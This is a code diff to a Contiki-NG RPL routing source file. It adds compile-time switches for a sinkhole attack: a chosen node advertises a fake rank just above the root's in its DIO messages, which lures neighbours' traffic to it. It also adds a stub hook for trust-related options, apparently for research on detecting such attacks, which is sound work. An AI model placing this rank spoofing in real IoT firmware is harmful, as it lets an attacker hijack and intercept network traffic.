@@ -51,6 +51,7 @@
 #include "net/routing/rpl-classic/rpl-private.h"
 #include "net/routing/rpl-classic/brpl-queue.h"
 #include "net/packetbuf.h"
+#include "net/linkaddr.h"
 #include "net/ipv6/multicast/uip-mcast6.h"
 #include "lib/random.h"
 
@@ -67,6 +68,34 @@
 #define RPL_DIO_MOP_SHIFT                3
 #define RPL_DIO_MOP_MASK                 0x38
 #define RPL_DIO_PREFERENCE_MASK          0x07
+
+/* Sinkhole attack controls (compile-time) */
+#ifndef ATTACK_MODE
+#define ATTACK_MODE 0
+#endif
+#ifndef ATTACKER_NODE_ID
+#define ATTACKER_NODE_ID 2
+#endif
+#ifndef SINKHOLE_RANK_DELTA
+#define SINKHOLE_RANK_DELTA 1
+#endif
+#define ATTACK_MODE_SELECTIVE 0
+#define ATTACK_MODE_SINKHOLE  1
+#define ATTACK_MODE_COMBINED  2
+
+__attribute__((weak)) uint8_t
+sinkhole_attack_is_enabled(void)
+{
+  return 1;
+}
+
+__attribute__((weak)) int
+smtrust_append_dio_options(uint8_t *buffer, int pos, int max_len)
+{
+  (void)buffer;
+  (void)max_len;
+  return pos;
+}
 
 /*---------------------------------------------------------------------------*/
 static void dis_input(void);
@@ -548,7 +577,17 @@ dio_output(rpl_instance_t *instance, uip_ipaddr_t *uc_addr)
   LOG_DBG("LEAF ONLY DIO rank set to RPL_INFINITE_RANK\n");
   set16(buffer, pos, RPL_INFINITE_RANK);
 #else /* RPL_LEAF_ONLY */
-  set16(buffer, pos, dag->rank);
+  if((ATTACK_MODE == ATTACK_MODE_SINKHOLE ||
+      ATTACK_MODE == ATTACK_MODE_COMBINED) &&
+     linkaddr_node_addr.u8[LINKADDR_SIZE - 1] == ATTACKER_NODE_ID &&
+     sinkhole_attack_is_enabled() &&
+     !is_root) {
+    rpl_rank_t root_rank = ROOT_RANK(instance);
+    rpl_rank_t adv = root_rank + SINKHOLE_RANK_DELTA;
+    set16(buffer, pos, adv);
+  } else {
+    set16(buffer, pos, dag->rank);
+  }
 #endif /* RPL_LEAF_ONLY */
   pos += 2;
 
@@ -581,7 +620,9 @@ dio_output(rpl_instance_t *instance, uip_ipaddr_t *uc_addr)
 
 #if !RPL_LEAF_ONLY
   if(instance->mc.type != RPL_DAG_MC_NONE) {
-    instance->of->update_metric_container(instance);
+    if(instance->of->update_metric_container) {
+      instance->of->update_metric_container(instance);
+    }
 
     buffer[pos++] = RPL_OPTION_DAG_METRIC_CONTAINER;
     buffer[pos++] = 6;
@@ -654,6 +695,8 @@ dio_output(rpl_instance_t *instance, uip_ipaddr_t *uc_addr)
     LOG_DBG("No prefix to announce (len %d)\n",
             dag->prefix_info.length);
   }
+
+  pos = smtrust_append_dio_options(buffer, pos, UIP_BUFSIZE);
 
 #if RPL_LEAF_ONLY
   if(LOG_DBG_ENABLED) {
